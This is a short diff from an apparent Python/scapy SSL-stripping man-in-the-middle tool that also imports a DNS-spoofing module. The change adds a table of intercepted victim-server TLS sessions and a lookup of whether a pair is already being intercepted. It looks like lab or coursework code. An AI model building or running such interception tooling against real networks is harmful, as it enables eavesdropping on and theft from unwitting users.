@@ -11,10 +11,15 @@ import dns_spoofing
 #SSL stripping attack
 # we want to intercept 2., then initiate https ourselves, and send http to the user
 
+#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html
+#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.automaton_cli.html for https connection with server
+#example from this page:
+#a = TLSClientAutomaton.tlslink(Raw, server="scapy.net", dport=443)
+#a.send(HTTP()/HTTPRequest())
 
 #TODO code for keeping track of ssl stripped sessions/victim-server pairs/idk?
-#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html
-#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.automaton_cli.html for sessions
+#(victim_ip, server_ip) : tls_session
+tls_sessions = {}
 
 #Check whether this is a redirect to https
 def https_switching_request(scapy_packet):
@@ -29,7 +34,13 @@ def https_switching_request(scapy_packet):
 
 # whether there already is a "client <--http--> us <--https--> server" situation
 def existing_connection(scapy_packet):
-    #TODO
+    ip_src = scapy_packet.getlayer(scapy.IP).src
+    ip_dst = scapy_packet.getlayer(scapy.IP).dst
+    
+    if (ip_src, ip_dst) in tls_sessions.keys():
+        return True
+    if (ip_dst, ip_src) in tls_sessions.keys():
+        return True
     return False
 
 def to_server(scapy_packet):
